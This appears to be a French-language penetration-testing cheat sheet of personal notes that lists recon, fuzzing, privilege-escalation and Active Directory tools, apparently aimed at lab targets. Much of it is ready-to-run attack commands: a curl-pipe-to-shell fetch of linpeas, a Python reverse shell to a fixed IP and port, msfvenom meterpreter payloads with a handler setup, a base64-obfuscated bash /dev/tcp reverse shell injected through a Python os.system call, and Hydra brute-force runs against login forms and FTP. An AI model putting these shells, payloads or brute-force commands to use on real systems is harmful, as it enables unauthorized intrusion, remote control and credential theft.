# TOOLS
FrameWork pour OSINT de numero de telephone => phoneinfoga 
FUZZ => Feroxbuster, dirb, dirbuster, gobuster

Scanner de vulnerabilitö web => nikto, Nessus, Rapid7, OpenVas
Done => fuzz sous-domaine + Port Scan (https://github.com/v4d1/Dome) 
wfuzz -H 'Host: FUZZ.****.com' -u 'https://10.10.10.113' -w '/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' --hc 301

Scanner de platforme web => BurpSuite, ZAProxy

Reconnaissance passive graphique => Maltego
Reconnaissance passive => Metagoofil

yersinia => Pour les protocoles de communication (Cisco et autre)

CRUNSH : DICO + SEL

CUPP : Création de dico en fonction des noms données

Setoolkit : Social Ingénieuring (copie de site pour récupérer les URL)

hashid : donne le type de hash d'un hash

arpspoof : recupere les requetes ARP et les transmets (man in the middle)

exiftool : metadata du fichier

hexdump : (-C) transformation en hexa du fichier bin

powershell-empire : comme metaspote, exploit windows

KrbRelayUp : Escalation privilege sur Windows en exploitant les requêtes LDAP non-signées

recon-ng : Framework de reconnaissance passive (avec API)

Discover : Framework de reconnaissance passive (avec API) + recon ng + google dorks

pypykatz / Empire : Check des fichiers pour monter les privilèges WINDOWS

linuxprivchecker et linpeas : Check des fichiers pour monter les privilèges LINUX
pspy : Un peu comme Linpeas
curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh

Steghide : Extraction de fichier a partir d'un autre fichier et passphrase

crackmapexec : Pentest orienté AD (connexion via plusieurs protocole, script, hash, un couteau suisse)

dnSpy : Reverse Application : https://github.com/dnSpy/dnSpy

------SMB------

enum4linux.py : Fait tout un tas de test sur le SMB

-----Scanner-----

nmapAutomator : 
```
git clone https://github.com/21y4d/nmapAutomator.git
sudo ln -s $(pwd)/nmapAutomator/nmapAutomator.sh /usr/local/bin/
```                
-----WEB------

Nikto : Pentest Web -> check une URL

dirb : brute force pour trouvé des pages web ou des dossiers

zaproxy : Nessus pour le web (scan les vulnérabilitées)

wpscan : scan wordpress -> Puissant

curl : requete vers site web

droopescan : Scan de site Drupal (comme Wpscan pour workPress)

Cewl : récupere les mots d'un site et fait un dico pour brute force

https://whatsmyname.app/ : recherche de compte a partir d'un pseudo 

GTFOBins : Exploit de binaire Linux => https://gtfobins.github.io/


------Reverse Shell -----
rlwrap -caR nc -lvnp $port : Ecoute et stabilise le shell

Netcat Ecoute :
nc -lvnp $port

Avoir un shell :
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
```
export RHOST="10.10.14.5";export RPORT=4242;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```
Autre NetCat : https://github.com/xct/xc
............ : https://github.com/calebstewart/pwncat

https://www.revshells.com/ : Générateur de shell


# BRUTE FORCE
Avec Hydra :
```
CSRF=$(curl -s -c dvwa.cookie "192.168.1.44/DVWA/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
```
```
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')```
```
```
curl -s -b dvwa.cookie -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "192.168.1.44/DVWA/login.php"
```
```
hydra  -L /usr/share/seclists/Usernames/top_shortlist.txt  -P /usr/share/seclists/Passwords/rockyou-40.txt \
  -e ns  -F  -u  -t 1  -w 10  -v  -V  192.168.1.44  http-get-form \
  "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome to the password protected area:H=Cookie\: security=low; PHPSESSID=${SESSIONID}"
```
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://TargetIp
```
# WORDLIST :
```
/usr/share/wordlists
  |--dirb
  |--dirbuster
  |--fasttrack.txt
  |--fern-wifi
  |--metasploit
  |--nmap.lst
  |--rockyou.txt
  |--wfuzz

/usr/share/wordlists/dirb/common.txt => sub domain 

/usr/share/wordlists/dirb/big.txt => sub domain 

/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 

/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/usr/share/seclist/bitquark-subdomains-top100000.txt

/usr/share/seclist/subdomains-top1millions-110000.txt
```


# AD / Windows Tools :

evil-winrm : connection a windows (avec un meterpreter)

BloodHound (avec neo4j)

windapsearch : Recherche sur LDAP (si soucis d'installation faire :
```
sudo pip2 install ldap3 
sudo apt install python3-ldap 
```

# MSFCONSOLE

Quand tu as besoin d'un reverse shell :
```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```
```
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
show options
set <RHOST>
set <PORT>
run
```

Reverse shell encodé en bqse64 :
```
echo 'bash -c "bash -i >& /dev/tcp/192.xxx.xx.xx/4444 0>&1"' | base64
-> YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNTAuMi80NDQ0IDA+JjEiCg==
```
puis : nc -lvp 4444
```
__import__("os").system("echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuNy4yNTAuMi80NDQ0IDA+JjEiCg== | base64 -d | bash")

```
